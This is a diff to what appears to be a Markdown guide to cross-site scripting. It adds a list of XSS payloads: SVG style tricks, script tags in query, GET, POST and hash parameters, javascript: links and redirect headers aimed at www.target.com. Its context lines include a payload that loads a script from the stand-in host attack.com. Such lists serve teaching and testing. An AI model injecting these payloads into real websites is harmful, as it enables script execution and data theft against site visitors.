@@ -11,7 +11,7 @@ Vulnerability is precisely a weakness in a web application that is exploited thr
 
 <code>You can learn more about vulnerabilities here: https://owasp.org/www-community/vulnerabilities/.</code>
 #### XSS
-XSS is an injection attack frequently based on JavaScript, but it can also include HTML or any type of code that our browser can execute. They inject into a web application with the focus of being executed by other users. In this way, it can send malicious code to other people who may mistakenly click on a script that captures sensitive or important information. 
+**Cross-site scripting** or **XSS** is an injection attack frequently based on JavaScript, but it can also include HTML or any type of code that our browser can execute. They inject into a web application with the focus of being executed by other users. In this way, it can send malicious code to other people who may mistakenly click on a script that captures sensitive or important information. 
 
 
 ### Payloads
@@ -64,7 +64,7 @@ Remote Code Execution Payload (inside a .swf file):
 load("http://www.attack.com/exploit.js");
 
 ```
-Example of payload with SVG:
+Example of payload with **SVG**:
 ```javascript
 SVG Payload:
 <svg onload="alert('XSS')"></svg>
@@ -102,11 +102,62 @@ Text Script Inclusion Payload:
 
 
 Script Inclusion Payload in Links (with base64):
-<svg mlns="http://www.one.site.org/1999/svg" xmlns:xlink="http://www.one.site.org/1999/xlink">
+<svg xmlns="http://www.one.site.org/1999/svg" xmlns:xlink="http://www.one.site.org/1999/xlink">
 <a xlink:href="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4="> 
     Click me
 </a>
 </svg>
 
+<svg xmlnx="http://www.one.site.org/1999/svg">
+    <style>
+    circle { fill: red;}
+    .xss {color: red;}
+    .xss {background-image: url("javascript:alert('XSS')");}
+    </style>
+</svg>
+```
+Examples of payloads with **URL**:
+```javascript
+Script Inclusion Payload in Query String:
+http://www.target.com/search?query=<script>alert('XSS')</script>
+
+
+Script Inclusion Payload in GET Parameters:
+http://www.target.com/page?name=<script>alert('XSS')</script>
+
+
+Script Inclusion Payload in Post Parameters:
+POST /page HTTP/1.1
+Host: www.target.com
+Content-Type: application/x-www-form-urlencoded
+
+name=<script>alert('XSS')</script>
+
+
+Script Inclusion Payload in Hash Parameters:
+http://www.target.com/page#<script>alert('XSS')</script>
+
+
+Script Inclusion Payload in Reference Parameters:
+http://www.target.com/page?ref=<script>alert('XSS')</script>
+
+
+Script Inclusion Payload in Event Attributes:
+<a href="javascript:alert('XSS')"> 
+    Click Here
+</a>
+
+Script Inclusion Payload in HTTP Redirection:
+Location: javascript:alert('XSS');
+
+
+Script Inclusion Payload in Style Links:
+<link rel="stylesheet" href="javascript:alert('XSS');">
+
+
+Script Inclusion Payload in HREF Attribute:
+<a href="javascript:alert('XSS')">
+    Click here
+</a>
 ```
 
